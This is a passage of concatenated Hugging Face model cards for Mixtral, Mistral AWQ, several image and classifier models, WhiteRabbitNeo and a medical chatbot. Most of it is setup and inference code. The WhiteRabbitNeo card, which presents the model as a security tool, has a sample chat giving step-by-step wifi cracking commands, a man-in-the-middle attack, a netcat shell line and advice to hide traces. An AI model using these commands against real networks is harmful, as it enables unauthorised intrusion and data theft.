Jonathan Leane, Martin Kemka, usrbinkat, Enrico Ros\nThank you to all my generous patrons and donaters!\nAnd thank you again to a16z for their generous grant.\nOriginal model card: Mistral AI_'s Mixtral 8X7B Instruct v0.1\nModel Card for Mixtral-8x7B\nThe Mixtral-8x7B Large Language Model (LLM) is a pretrained generative Sparse Mixture of Experts. The Mixtral-8x7B outperforms Llama 2 70B on most benchmarks we tested.\nFor full details of this model please read our release blog post.\nWarning\nThis repo contains weights that are compatible with vLLM serving of the model as well as Hugging Face transformers library. It is based on the original Mixtral torrent release, but the file format and parameter names are different. Please note that model cannot (yet) be instantiated with HF.\nInstruction format\nThis format must be strictly respected, otherwise the model will generate sub-optimal outputs.\nThe template used to build a prompt for the Instruct model is defined as follows:\n<s> [INST] Instruction [/INST] Model answer</s> [INST] Follow-up instruction [/INST]\nNote that <s> and </s> are special tokens for beginning of string (BOS) and end of string (EOS) while [INST] and [/INST] are regular strings.\nAs reference, here is the pseudo-code used to tokenize instructions during fine-tuning:\ndef tokenize(text):\nreturn tok.encode(text, add_special_tokens=False)\n[BOS_ID] +\ntokenize(\"[INST]\") + tokenize(USER_MESSAGE_1) + tokenize(\"[/INST]\") +\ntokenize(BOT_MESSAGE_1) + [EOS_ID] +\nâ€¦\ntokenize(\"[INST]\") + tokenize(USER_MESSAGE_N) + tokenize(\"[/INST]\") +\ntokenize(BOT_MESSAGE_N) + [EOS_ID]\nIn the pseudo-code above, note that the tokenize method should not add a BOS or EOS token automatically, but should add a prefix space.\nRun the model\nfrom transformers import AutoModelForCausalLM, AutoTokenizer\nmodel_id = \"mistralai/Mixtral-8x7B-Instruct-v0.1\"\ntokenizer = AutoTokenizer.from_pretrained(model_id)\nmodel = AutoModelForCausalLM.from_pretrained(model_id)\ntext = \"Hello my name is\"\ninputs = tokenizer(text, return_tensors=\"pt\")\noutputs = model.generate(**inputs, max_new_tokens=20)\nprint(tokenizer.decode(outputs[0], skip_special_tokens=True))\nBy default, transformers will load the model in full precision. Therefore you might be interested to further reduce down the memory requirements to run the model through the optimizations we offer in HF ecosystem:\nIn half-precision\nNote float16 precision only works on GPU devices\nClick to expand\n+ import torch\nfrom transformers import AutoModelForCausalLM, AutoTokenizer\nmodel_id = \"mistralai/Mixtral-8x7B-Instruct-v0.1\"\ntokenizer = AutoTokenizer.from_pretrained(model_id)\n+ model = AutoModelForCausalLM.from_pretrained(model_id, torch_dtype=torch.float16).to(0)\ntext = \"Hello my name is\"\n+ inputs = tokenizer(text, return_tensors=\"pt\").to(0)\noutputs = model.generate(**inputs, max_new_tokens=20)\nprint(tokenizer.decode(outputs[0], skip_special_tokens=True))\nLower precision using (8-bit & 4-bit) using bitsandbytes\nClick to expand\n+ import torch\nfrom transformers import AutoModelForCausalLM, AutoTokenizer\nmodel_id = \"mistralai/Mixtral-8x7B-Instruct-v0.1\"\ntokenizer = AutoTokenizer.from_pretrained(model_id)\n+ model = AutoModelForCausalLM.from_pretrained(model_id, load_in_4bit=True)\ntext = \"Hello my name is\"\n+ inputs = tokenizer(text, return_tensors=\"pt\").to(0)\noutputs = model.generate(**inputs, max_new_tokens=20)\nprint(tokenizer.decode(outputs[0], skip_special_tokens=True))\nLoad the model with Flash Attention 2\nClick to expand\n+ import torch\nfrom transformers import AutoModelForCausalLM, AutoTokenizer\nmodel_id = \"mistralai/Mixtral-8x7B-Instruct-v0.1\"\ntokenizer = AutoTokenizer.from_pretrained(model_id)\n+ model = AutoModelForCausalLM.from_pretrained(model_id, use_flash_attention_2=True)\ntext = \"Hello my name is\"\n+ inputs = tokenizer(text, return_tensors=\"pt\").to(0)\noutputs = model.generate(**inputs, max_new_tokens=20)\nprint(tokenizer.decode(outputs[0], skip_special_tokens=True))\nLimitations\nThe Mixtral-8x7B Instruct model is a quick demonstration that the base model can be easily fine-tuned to achieve compelling performance.\nIt does not have any moderation mechanisms. We're looking forward to engaging with the community on ways to\nmake the model finely respect guardrails, allowing for deployment in environments requiring moderated outputs.\nThe Mistral AI Team\nAlbert Jiang, Alexandre Sablayrolles, Arthur Mensch, Blanche Savary, Chris Bamford, Devendra Singh Chaplot, Diego de las Casas, Emma Bou Hanna, Florian Bressand, Gianna Lengyel, Guillaume Bour, Guillaume Lample, LÃ©lio Renard Lavaud, Louis Ternon, Lucile Saulnier, Marie-Anne Lachaux, Pierre Stock, Teven Le Scao, ThÃ©ophile Gervet, Thibaut Lavril, Thomas Wang, TimothÃ©e Lacroix, William El Sayed.",
    "TheBloke/Mistral-7B-Instruct-v0.2-AWQ": "Mistral 7B Instruct v0.2 - AWQ\nDescription\nAbout AWQ\nRepositories available\nPrompt template: Mistral\nProvided files, and AWQ parameters\nHow to easily download and use this model in text-generation-webui\nMulti-user inference server: vLLM\nMulti-user inference server: Hugging Face Text Generation Inference (TGI)\nInference from Python code using Transformers\nInstall the necessary packages\nTransformers example code (requires Transformers 4.35.0 and later)\nCompatibility\nDiscord\nThanks, and how to contribute\nOriginal model card: Mistral AI_'s Mistral 7B Instruct v0.2\nModel Card for Mistral-7B-Instruct-v0.2\nInstruction format\nModel Architecture\nTroubleshooting\nLimitations\nThe Mistral AI Team\nChat & support: TheBloke's Discord server\nWant to contribute? TheBloke's Patreon page\nTheBloke's LLM work is generously supported by a grant from andreessen horowitz (a16z)\nMistral 7B Instruct v0.2 - AWQ\nModel creator: Mistral AI_\nOriginal model: Mistral 7B Instruct v0.2\nDescription\nThis repo contains AWQ model files for Mistral AI_'s Mistral 7B Instruct v0.2.\nThese files were quantised using hardware kindly provided by Massed Compute.\nAbout AWQ\nAWQ is an efficient, accurate and blazing-fast low-bit weight quantization method, currently supporting 4-bit quantization. Compared to GPTQ, it offers faster Transformers-based inference with equivalent or better quality compared to the most commonly used GPTQ settings.\nAWQ models are currently supported on Linux and Windows, with NVidia GPUs only. macOS users: please use GGUF models instead.\nIt is supported by:\nText Generation Webui - using Loader: AutoAWQ\nvLLM - version 0.2.2 or later for support for all model types.\nHugging Face Text Generation Inference (TGI)\nTransformers version 4.35.0 and later, from any code or client that supports Transformers\nAutoAWQ - for use from Python code\nRepositories available\nAWQ model(s) for GPU inference.\nGPTQ models for GPU inference, with multiple quantisation parameter options.\n2, 3, 4, 5, 6 and 8-bit GGUF models for CPU+GPU inference\nMistral AI_'s original unquantised fp16 model in pytorch format, for GPU inference and for further conversions\nPrompt template: Mistral\n<s>[INST] {prompt} [/INST]\nProvided files, and AWQ parameters\nI currently release 128g GEMM models only. The addition of group_size 32 models, and GEMV kernel models, is being actively considered.\nModels are released as sharded safetensors files.\nBranch\nBits\nGS\nAWQ Dataset\nSeq Len\nSize\nmain\n4\n128\nVMware Open Instruct\n4096\n4.15 GB\nHow to easily download and use this model in text-generation-webui\nPlease make sure you're using the latest version of text-generation-webui.\nIt is strongly recommended to use the text-generation-webui one-click-installers unless you're sure you know how to make a manual install.\nClick the Model tab.\nUnder Download custom model or LoRA, enter TheBloke/Mistral-7B-Instruct-v0.2-AWQ.\nClick Download.\nThe model will start downloading. Once it's finished it will say \"Done\".\nIn the top left, click the refresh icon next to Model.\nIn the Model dropdown, choose the model you just downloaded: Mistral-7B-Instruct-v0.2-AWQ\nSelect Loader: AutoAWQ.\nClick Load, and the model will load and is now ready for use.\nIf you want any custom settings, set them and then click Save settings for this model followed by Reload the Model in the top right.\nOnce you're ready, click the Text Generation tab and enter a prompt to get started!\nMulti-user inference server: vLLM\nDocumentation on installing and using vLLM can be found here.\nPlease ensure you are using vLLM version 0.2 or later.\nWhen using vLLM as a server, pass the --quantization awq parameter.\nFor example:\npython3 -m vllm.entrypoints.api_server --model TheBloke/Mistral-7B-Instruct-v0.2-AWQ --quantization awq --dtype auto\nWhen using vLLM from Python code, again set quantization=awq.\nFor example:\nfrom vllm import LLM, SamplingParams\nprompts = [\n\"Tell me about AI\",\n\"Write a story about llamas\",\n\"What is 291 - 150?\",\n\"How much wood would a woodchuck chuck if a woodchuck could chuck wood?\",\n]\nprompt_template=f'''<s>[INST] {prompt} [/INST]\n'''\nprompts = [prompt_template.format(prompt=prompt) for prompt in prompts]\nsampling_params = SamplingParams(temperature=0.8, top_p=0.95)\nllm = LLM(model=\"TheBloke/Mistral-7B-Instruct-v0.2-AWQ\", quantization=\"awq\", dtype=\"auto\")\noutputs = llm.generate(prompts, sampling_params)\n# Print the outputs.\nfor output in outputs:\nprompt = output.prompt\ngenerated_text = output.outputs[0].text\nprint(f\"Prompt: {prompt!r}, Generated text: {generated_text!r}\")\nMulti-user inference server: Hugging Face Text Generation Inference (TGI)\nUse TGI version 1.1.0 or later. The official Docker container is: ghcr.io/huggingface/text-generation-inference:1.1.0\nExample Docker parameters:\n--model-id TheBloke/Mistral-7B-Instruct-v0.2-AWQ --port 3000 --quantize awq --max-input-length 3696 --max-total-tokens 4096 --max-batch-prefill-tokens 4096\nExample Python code for interfacing with TGI (requires huggingface-hub 0.17.0 or later):\npip3 install huggingface-hub\nfrom huggingface_hub import InferenceClient\nendpoint_url = \"https://your-endpoint-url-here\"\nprompt = \"Tell me about AI\"\nprompt_template=f'''<s>[INST] {prompt} [/INST]\n'''\nclient = InferenceClient(endpoint_url)\nresponse = client.text_generation(prompt,\nmax_new_tokens=128,\ndo_sample=True,\ntemperature=0.7,\ntop_p=0.95,\ntop_k=40,\nrepetition_penalty=1.1)\nprint(f\"Model output: \", response)\nInference from Python code using Transformers\nInstall the necessary packages\nRequires: Transformers 4.35.0 or later.\nRequires: AutoAWQ 0.1.6 or later.\npip3 install --upgrade \"autoawq>=0.1.6\" \"transformers>=4.35.0\"\nNote that if you are using PyTorch 2.0.1, the above AutoAWQ command will automatically upgrade you to PyTorch 2.1.0.\nIf you are using CUDA 11.8 and wish to continue using PyTorch 2.0.1, instead run this command:\npip3 install https://github.com/casper-hansen/AutoAWQ/releases/download/v0.1.6/autoawq-0.1.6+cu118-cp310-cp310-linux_x86_64.whl\nIf you have problems installing AutoAWQ using the pre-built wheels, install it from source instead:\npip3 uninstall -y autoawq\ngit clone https://github.com/casper-hansen/AutoAWQ\ncd AutoAWQ\npip3 install .\nTransformers example code (requires Transformers 4.35.0 and later)\nfrom transformers import AutoModelForCausalLM, AutoTokenizer, TextStreamer\nmodel_name_or_path = \"TheBloke/Mistral-7B-Instruct-v0.2-AWQ\"\ntokenizer = AutoTokenizer.from_pretrained(model_name_or_path)\nmodel = AutoModelForCausalLM.from_pretrained(\nmodel_name_or_path,\nlow_cpu_mem_usage=True,\ndevice_map=\"cuda:0\"\n)\n# Using the text streamer to stream output one token at a time\nstreamer = TextStreamer(tokenizer, skip_prompt=True, skip_special_tokens=True)\nprompt = \"Tell me about AI\"\nprompt_template=f'''<s>[INST] {prompt} [/INST]\n'''\n# Convert prompt to tokens\ntokens = tokenizer(\nprompt_template,\nreturn_tensors='pt'\n).input_ids.cuda()\ngeneration_params = {\n\"do_sample\": True,\n\"temperature\": 0.7,\n\"top_p\": 0.95,\n\"top_k\": 40,\n\"max_new_tokens\": 512,\n\"repetition_penalty\": 1.1\n}\n# Generate streamed output, visible one token at a time\ngeneration_output = model.generate(\ntokens,\nstreamer=streamer,\n**generation_params\n)\n# Generation without a streamer, which will include the prompt in the output\ngeneration_output = model.generate(\ntokens,\n**generation_params\n)\n# Get the tokens from the output, decode them, print them\ntoken_output = generation_output[0]\ntext_output = tokenizer.decode(token_output)\nprint(\"model.generate output: \", text_output)\n# Inference is also possible via Transformers' pipeline\nfrom transformers import pipeline\npipe = pipeline(\n\"text-generation\",\nmodel=model,\ntokenizer=tokenizer,\n**generation_params\n)\npipe_output = pipe(prompt_template)[0]['generated_text']\nprint(\"pipeline output: \", pipe_output)\nCompatibility\nThe files provided are tested to work with:\ntext-generation-webui using Loader: AutoAWQ.\nvLLM version 0.2.0 and later.\nHugging Face Text Generation Inference (TGI) version 1.1.0 and later.\nTransformers version 4.35.0 and later.\nAutoAWQ version 0.1.1 and later.\nDiscord\nFor further support, and discussions on these models and AI in general, join us at:\nTheBloke AI's Discord server\nThanks, and how to contribute\nThanks to the chirper.ai team!\nThanks to Clay from gpus.llm-utils.org!\nI've had a lot of people ask if they can contribute. I enjoy providing models and helping people, and would love to be able to spend even more time doing it, as well as expanding into new projects like fine tuning/training.\nIf you're able and willing to contribute it will be most gratefully received and will help me to keep providing more models, and to start work on new AI projects.\nDonaters will get priority support on any and all AI/LLM/model questions and requests, access to a private Discord room, plus other benefits.\nPatreon: https://patreon.com/TheBlokeAI\nKo-Fi: https://ko-fi.com/TheBlokeAI\nSpecial thanks to: Aemon Algiz.\nPatreon special mentions: Michael Levine, é˜¿æ˜, Trailburnt, Nikolai Manek, John Detwiler, Randy H, Will Dee, Sebastain Graf, NimbleBox.ai, Eugene Pentland, Emad Mostaque, Ai Maven, Jim Angel, Jeff Scroggin, Michael Davis, Manuel Alberto Morcote, Stephen Murray, Robert, Justin Joy, Luke @flexchar, Brandon Frisco, Elijah Stavena, S_X, Dan Guido, Undi ., Komninos Chatzipapas, Shadi, theTransient, Lone Striker, Raven Klaugh, jjj, Cap'n Zoog, Michel-Marie MAUDET (LINAGORA), Matthew Berman, David, Fen Risland, Omer Bin Jawed, Luke Pendergrass, Kalila, OG, Erik BjÃ¤reholt, Rooh Singh, Joseph William Delisle, Dan Lewis, TL, John Villwock, AzureBlack, Brad, Pedro Madruga, Caitlyn Gatomon, K, jinyuan sun, Mano Prime, Alex, Jeffrey Morgan, Alicia Loh, Illia Dulskyi, Chadd, transmissions 11, fincy, Rainer Wilmers, ReadyPlayerEmma, knownsqashed, Mandus, biorpg, Deo Leter, Brandon Phillips, SuperWojo, Sean Connelly, Iucharbius, Jack West, Harry Royden McLaughlin, Nicholas, terasurfer, Vitor Caleffi, Duane Dunston, Johann-Peter Hartmann, David Ziegler, Olakabola, Ken Nordquist, Trenton Dambrowitz, Tom X Nguyen, Vadim, Ajan Kanaga, Leonard Tan, Clay Pascal, Alexandros Triantafyllidis, JM33133, Xule, vamX, ya boyyy, subjectnull, Talal Aujan, Alps Aficionado, wassieverse, Ari Malik, James Bentley, Woland, Spencer Kim, Michael Dempsey, Fred von Graf, Elle, zynix, William Richards, Stanislav Ovsiannikov, Edmond Seymore, Jonathan Leane, Martin Kemka, usrbinkat, Enrico Ros\nThank you to all my generous patrons and donaters!\nAnd thank you again to a16z for their generous grant.\nOriginal model card: Mistral AI_'s Mistral 7B Instruct v0.2\nModel Card for Mistral-7B-Instruct-v0.2\nThe Mistral-7B-Instruct-v0.2 Large Language Model (LLM) is an improved instruct fine-tuned version of Mistral-7B-Instruct-v0.1.\nFor full details of this model please read our paper and release blog post.\nInstruction format\nIn order to leverage instruction fine-tuning, your prompt should be surrounded by [INST] and [/INST] tokens. The very first instruction should begin with a begin of sentence id. The next instructions should not. The assistant generation will be ended by the end-of-sentence token id.\nE.g.\ntext = \"<s>[INST] What is your favourite condiment? [/INST]\"\n\"Well, I'm quite partial to a good squeeze of fresh lemon juice. It adds just the right amount of zesty flavour to whatever I'm cooking up in the kitchen!</s> \"\n\"[INST] Do you have mayonnaise recipes? [/INST]\"\nThis format is available as a chat template via the apply_chat_template() method:\nfrom transformers import AutoModelForCausalLM, AutoTokenizer\ndevice = \"cuda\" # the device to load the model onto\nmodel = AutoModelForCausalLM.from_pretrained(\"mistralai/Mistral-7B-Instruct-v0.1\")\ntokenizer = AutoTokenizer.from_pretrained(\"mistralai/Mistral-7B-Instruct-v0.1\")\nmessages = [\n{\"role\": \"user\", \"content\": \"What is your favourite condiment?\"},\n{\"role\": \"assistant\", \"content\": \"Well, I'm quite partial to a good squeeze of fresh lemon juice. It adds just the right amount of zesty flavour to whatever I'm cooking up in the kitchen!\"},\n{\"role\": \"user\", \"content\": \"Do you have mayonnaise recipes?\"}\n]\nencodeds = tokenizer.apply_chat_template(messages, return_tensors=\"pt\")\nmodel_inputs = encodeds.to(device)\nmodel.to(device)\ngenerated_ids = model.generate(model_inputs, max_new_tokens=1000, do_sample=True)\ndecoded = tokenizer.batch_decode(generated_ids)\nprint(decoded[0])\nModel Architecture\nThis instruction model is based on Mistral-7B-v0.1, a transformer model with the following architecture choices:\nGrouped-Query Attention\nSliding-Window Attention\nByte-fallback BPE tokenizer\nTroubleshooting\nIf you see the following error:\nTraceback (most recent call last):\nFile \"\", line 1, in\nFile \"/transformers/models/auto/auto_factory.py\", line 482, in from_pretrained\nconfig, kwargs = AutoConfig.from_pretrained(\nFile \"/transformers/models/auto/configuration_auto.py\", line 1022, in from_pretrained\nconfig_class = CONFIG_MAPPING[config_dict[\"model_type\"]]\nFile \"/transformers/models/auto/configuration_auto.py\", line 723, in getitem\nraise KeyError(key)\nKeyError: 'mistral'\nInstalling transformers from source should solve the issue\npip install git+https://github.com/huggingface/transformers\nThis should not be required after transformers-v4.33.4.\nLimitations\nThe Mistral 7B Instruct model is a quick demonstration that the base model can be easily fine-tuned to achieve compelling performance.\nIt does not have any moderation mechanisms. We're looking forward to engaging with the community on ways to\nmake the model finely respect guardrails, allowing for deployment in environments requiring moderated outputs.\nThe Mistral AI Team\nAlbert Jiang, Alexandre Sablayrolles, Arthur Mensch, Blanche Savary, Chris Bamford, Devendra Singh Chaplot, Diego de las Casas, Emma Bou Hanna, Florian Bressand, Gianna Lengyel, Guillaume Bour, Guillaume Lample, LÃ©lio Renard Lavaud, Louis Ternon, Lucile Saulnier, Marie-Anne Lachaux, Pierre Stock, Teven Le Scao, ThÃ©ophile Gervet, Thibaut Lavril, Thomas Wang, TimothÃ©e Lacroix, William El Sayed.",
    "upstage/SOLAR-10.7B-Instruct-v1.0": "",
    "sarvamai/OpenHathi-7B-Hi-v0.1-Base": "",
    "TheBloke/SOLAR-10.7B-v1.0-GGUF": "",
    "w4r10ck/SOLAR-10.7B-Instruct-v1.0-uncensored": "",
    "lenguist/longformer-coherence-synthetic-classifier": "longformer-coherence-synthetic-classifier\nModel description\nIntended uses & limitations\nTraining and evaluation data\nTraining procedure\nTraining hyperparameters\nTraining results\nFramework versions\nlongformer-coherence-synthetic-classifier\nThis model is a fine-tuned version of allenai/longformer-base-4096 on the None dataset.\nIt achieves the following results on the evaluation set:\nLoss: 0.0289\nAccuracy: 0.9945\nModel description\nMore information needed\nIntended uses & limitations\nMore information needed\nTraining and evaluation data\nMore information needed\nTraining procedure\nTraining hyperparameters\nThe following hyperparameters were used during training:\nlearning_rate: 2e-05\ntrain_batch_size: 1\neval_batch_size: 1\nseed: 42\ngradient_accumulation_steps: 4\ntotal_train_batch_size: 4\noptimizer: Adam with betas=(0.9,0.999) and epsilon=1e-08\nlr_scheduler_type: linear\nnum_epochs: 1\nTraining results\nTraining Loss\nEpoch\nStep\nValidation Loss\nAccuracy\n0.0646\n1.0\n2000\n0.0289\n0.9945\nFramework versions\nTransformers 4.35.2\nPytorch 2.1.0+cu121\nDatasets 2.15.0\nTokenizers 0.15.0",
    "hatosei03/VNDH2023_Smart_Interior_Consultant_HKKTT": "SIC\nDownload model\nSIC\nPrompt\nA modern, yellow-colored kitchen with large cupboards and a dining table\nNegative Prompt\nBlurry photo, distortion, low-res, poor quality\nPrompt\nA modern, minimalist, purple-colored bedroom has a window\nNegative Prompt\nBlurry photo, distortion, low-res, poor quality\nDownload model\nWeights for this model are available in Safetensors format.\nDownload them in the Files & versions tab.",
    "ntc-ai/SDXL-LoRA-slider.sexy": "ntcai.xyz slider - sexy (SDXL LoRA)\nDownload\nTrigger words\nUse in diffusers\nSupport the Patreon\nOther resources\nntcai.xyz slider - sexy (SDXL LoRA)\nStrength: -3\nStrength: 0\nStrength: 3\nSee more at https://sliders.ntcai.xyz/sliders/app/loras/d98bfe99-0ea7-4bb4-b8b3-86b8238acb92\nDownload\nWeights for this model are available in Safetensors format.\nTrigger words\nYou can apply this LoRA with trigger words for additional effect:\nsexy\nUse in diffusers\nfrom diffusers import StableDiffusionXLPipeline\nfrom diffusers import EulerAncestralDiscreteScheduler\nimport torch\npipe = StableDiffusionXLPipeline.from_single_file(\"https://huggingface.co/martyn/sdxl-turbo-mario-merge-top-rated/blob/main/topRatedTurboxlLCM_v10.safetensors\")\npipe.to(\"cuda\")\npipe.scheduler = EulerAncestralDiscreteScheduler.from_config(pipe.scheduler.config)\n# Load the LoRA\npipe.load_lora_weights('ntc-ai/SDXL-LoRA-slider.sexy', weight_name='sexy.safetensors', adapter_name=\"sexy\")\n# Activate the LoRA\npipe.set_adapters([\"sexy\"], adapter_weights=[2.0])\nprompt = \"medieval rich kingpin sitting in a tavern, sexy\"\nnegative_prompt = \"nsfw\"\nwidth = 512\nheight = 512\nnum_inference_steps = 10\nguidance_scale = 2\nimage = pipe(prompt, negative_prompt=negative_prompt, width=width, height=height, guidance_scale=guidance_scale, num_inference_steps=num_inference_steps).images[0]\nimage.save('result.png')\nSupport the Patreon\nIf you like this model please consider joining our Patreon.\nBy joining our Patreon, you'll gain access to an ever-growing library of over 1496+ unique and diverse LoRAs along with 14602+ slider merges, covering a wide range of styles and genres. You'll also receive early access to new models and updates, exclusive behind-the-scenes content, and the powerful NTC Slider Factory LoRA creator, allowing you to craft your own custom LoRAs and merges opening up endless possibilities.\nYour support on Patreon will allow us to continue developing new models and tools.\nOther resources\nCivitAI - Follow ntc on Civit for even more LoRAs\nntcai.xyz - See ntcai.xyz to find more articles and LoRAs",
    "WhiteRabbitNeo/WhiteRabbitNeo-13B-v1": "Our 33B model is now in beta!\nOur Discord Server\nLLaMA-2 Licence + WhiteRabbitNeo Extended Version\nLicence: Usage Restrictions\nTerms of Use\nWhiteRabbitNeo\nSample Conversation:\nOur 33B model is now in beta!\nAccess at: https://www.whiterabbitneo.com/\nOur Discord Server\nJoin us at: https://discord.gg/8Ynkrcbk92 (Updated on Dec 29th. Now permanent link to join)\nLLaMA-2 Licence + WhiteRabbitNeo Extended Version\nLicence: Usage Restrictions\nYou agree not to use the Model or Derivatives of the Model:\n-\tIn any way that violates any applicable national or international law or regulation or infringes upon the lawful rights and interests of any third party;\n-\tFor military use in any way;\n-\tFor the purpose of exploiting, harming or attempting to exploit or harm minors in any way;\n-\tTo generate or disseminate verifiably false information and/or content with the purpose of harming others;\n-\tTo generate or disseminate inappropriate content subject to applicable regulatory requirements;\n-\tTo generate or disseminate personal identifiable information without due authorization or for unreasonable use;\n-\tTo defame, disparage or otherwise harass others;\n-\tFor fully automated decision making that adversely impacts an individualâ€™s legal rights or otherwise creates or modifies a binding, enforceable obligation;\n-\tFor any use intended to or which has the effect of discriminating against or harming individuals or groups based on online or offline social behavior or known or predicted personal or personality characteristics;\n-\tTo exploit any of the vulnerabilities of a specific group of persons based on their age, social, physical or mental characteristics, in order to materially distort the behavior of a person pertaining to that group in a manner that causes or is likely to cause that person or another person physical or psychological harm;\n-\tFor any use intended to or which has the effect of discriminating against individuals or groups based on legally protected characteristics or categories.\nTerms of Use\nBy accessing and using this Artificial Intelligence (AI) model, you, the user, acknowledge and agree that you are solely responsible for your use of the model and its outcomes. You hereby agree to indemnify, defend, and hold harmless the creators, developers, and any affiliated persons or entities of this AI model from and against any and all claims, liabilities, damages, losses, costs, expenses, fees (including reasonable attorneys' fees and court costs) that may arise, directly or indirectly, from your use of the AI model.\nThis AI model is provided \"as is\" and \"as available\" without any warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and non-infringement. The creators make no warranty that the AI model will meet your requirements or be available on an uninterrupted, secure, or error-free basis.\nYour use of the AI model is at your own risk and discretion, and you will be solely responsible for any damage to computer systems or loss of data that results from the use of the AI model.\nThis disclaimer constitutes part of the agreement between you and the creators of the AI model regarding your use of the model, superseding any prior agreements between you and the creators regarding your use of this AI model.\nWhiteRabbitNeo\nWhiteRabbitNeo is a model series that can be used for offensive and defensive cybersecurity.\nThis 13B model is getting released as a public preview of its capabilities, and also to assess the societal impact of such an AI.\nimport torch, json\nfrom transformers import AutoModelForCausalLM, AutoTokenizer\nmodel_path = \"/home/migel/models/WhiteRabbitNeo\"\nmodel = AutoModelForCausalLM.from_pretrained(\nmodel_path,\ntorch_dtype=torch.float16,\ndevice_map=\"auto\",\nload_in_4bit=False,\nload_in_8bit=True,\ntrust_remote_code=True,\n)\ntokenizer = AutoTokenizer.from_pretrained(model_path, trust_remote_code=True)\ndef generate_text(instruction):\ntokens = tokenizer.encode(instruction)\ntokens = torch.LongTensor(tokens).unsqueeze(0)\ntokens = tokens.to(\"cuda\")\ninstance = {\n\"input_ids\": tokens,\n\"top_p\": 1.0,\n\"temperature\": 0.5,\n\"generate_len\": 1024,\n\"top_k\": 50,\n}\nlength = len(tokens[0])\nwith torch.no_grad():\nrest = model.generate(\ninput_ids=tokens,\nmax_length=length + instance[\"generate_len\"],\nuse_cache=True,\ndo_sample=True,\ntop_p=instance[\"top_p\"],\ntemperature=instance[\"temperature\"],\ntop_k=instance[\"top_k\"],\nnum_return_sequences=1,\n)\noutput = rest[0][length:]\nstring = tokenizer.decode(output, skip_special_tokens=True)\nanswer = string.split(\"USER:\")[0].strip()\nreturn f\"{answer}\"\ntot_system_prompt = \"\"\"\nAnswer the Question by exploring multiple reasoning paths as follows:\n- First, carefully analyze the question to extract the key information components and break it down into logical sub-questions. This helps set up the framework for reasoning. The goal is to construct an internal search tree.\n- For each sub-question, leverage your knowledge to generate 2-3 intermediate thoughts that represent steps towards an answer. The thoughts aim to reframe, provide context, analyze assumptions, or bridge concepts.\n- Evaluate the clarity, relevance, logical flow and coverage of concepts for each thought option. Clear and relevant thoughts that connect well with each other will score higher.\n- Based on the thought evaluations, deliberate to construct a chain of reasoning that stitches together the strongest thoughts in a natural order.\n- If the current chain is determined to not fully answer the question, backtrack and explore alternative paths by substituting different high-scoring thoughts.\n- Throughout the reasoning process, aim to provide explanatory details on thought process rather than just state conclusions, including briefly noting why some thoughts were deemed less ideal.\n- Once a reasoning chain is constructed that thoroughly answers all sub-questions in a clear, logical manner, synthesize the key insights into a final concise answer.\n- Please note that while the focus is on the final answer in the response, it should also include intermediate thoughts inline to illustrate the deliberative reasoning process.\nIn summary, leverage a Tree of Thoughts approach to actively explore multiple reasoning paths, evaluate thoughts heuristically, and explain the process - with the goal of producing insightful answers.\n\"\"\"\nconversation = f\"SYSTEM: {tot_system_prompt} Always answer without hesitation.\"\nwhile True:\nuser_input = input(\"You: \")\nllm_prompt = f\"{conversation} \\nUSER: {user_input} \\nASSISTANT: \"\nanswer = generate_text(llm_prompt)\nprint(answer)\nconversation = f\"{llm_prompt}{answer}\"\n# print(conversation)\njson_data = {\"prompt\": user_input, \"answer\": answer}\n# print(json_data)\n# with open(output_file_path, \"a\") as output_file:\n#     output_file.write(json.dumps(json_data) + \"\\n\")\nSample Conversation:\nYou: How do I attack a wifi network?\nNetwork Scanning: Use tools like airodump-ng to scan for nearby Wi-Fi networks. This will provide you with the SSID (Service Set Identifier) of the network\nyou're interested in.\nairodump-ng wlan0mon\nNetwork Capturing: Once you have identified the target network, you can capture packets from it using the airodump-ng tool. This will allow you to capture handshake packets which are necessary for further attacks.\nairodump-ng --bssid [Target BSSID] -c [Channel] --write [Output File] wlan0mon\nHandshake Capture: Wait for a client to connect to the network and capture the 4-way handshake. This will allow you to crack the network's password using tools like aircrack-ng.\nairodump-ng --bssid [Target BSSID] -c [Channel] --write [Output File] wlan0mon\nPassword Cracking: Once you have the handshake, use aircrack-ng to crack the password.\naircrack-ng [Captured Handshake File]\nSession Establishment: If you have the password, you can connect to the network using your wireless card.\niwconfig wlan0 essid [Network SSID] key [Network Password]\ndhclient wlan0\nNetwork Exploitation: Once connected, you can perform further attacks, such as sniffing traffic (tcpdump), or launching a man-in-the-middle attack using tools like ettercap or arpspoof.\ntcpdump -i wlan0 -w [Packet Capture File]\nettercap -T -i [Interface] -M arp [Target IP]\nPost-Exploitation: After gaining access to the network, you can exfiltrate data, execute commands, or perform other malicious activities.\nnc -lvp [Local Port] -e /bin/bash\nCleanup: Remember to clean up any traces of your activities to avoid detection and legal consequences.\nairmon-ng stop wlan0mon\nPlease note that all these steps should be performed in a legal and ethical manner, and only on networks you have permission to test. Unauthorized access to computer networks is illegal and unethical.",
    "ThisIs-Developer/Llama-2-GGML-Medical-Chatbot": "ğŸ Llama-2-GGML-Medical-Chatbot ğŸ¤–\nğŸ“š Here are some of the features of the Llama-2-7B-Chat-GGML-Medical-Chatbot:\nğŸš€ Quickstart\nğŸ“– ChatBot Conversession\nâ›“ï¸Chainlit ver. on #v1.0.1.dev20230913\nâš¡Streamlit ver. on #v2.0.1.dev20231230\nDEMO: ğŸ“½ï¸Conversession.vid.mp4->https://cdn-uploads.huggingface.co/production/uploads/64d8c442a4839890b2490db9/iI4t0lhjkCw3dDSvWQ4Jk.mp4\nğŸ Llama-2-GGML-Medical-Chatbot ğŸ¤–\nThe Llama-2-7B-Chat-GGML-Medical-Chatbot is a repository for a medical chatbot that uses the Llama-2-7B-Chat-GGML model and the pdf The Gale Encyclopedia of Medicine. The chatbot is still under development, but it has the potential to be a valuable tool for patients, healthcare professionals, and researchers. The chatbot can be used to answer questions about medical topics, provide summaries of medical articles, and generate medical text. However, it is important to note that the chatbot is not a substitute for medical advice from a qualified healthcare professional.\nğŸ“š Here are some of the features of the Llama-2-7B-Chat-GGML-Medical-Chatbot:\nIt uses the Llama-2-7B-Chat-GGML model, which is a large language model (LLM) that has been fine-tuned.\nName - llama-2-7b-chat.ggmlv3.q2_K.bin\nQuant method - q2_K\nBits - 2\nSize - 2.87 GB\nMax RAM required - 5.37 GB\nUse case - New k-quant method. Uses GGML_TYPE_Q4_K for the attention.vw and feed_forward.w2 tensors, GGML_TYPE_Q2_K for the other tensors.\nModel: Know more about model Llama-2-7B-Chat-GGML\nIt is trained on the pdf The Gale Encyclopedia of Medicine, Volume 1, 2nd Edition, 637-page PDF, which is a comprehensive medical reference that provides information on a wide range of medical topics. This means that 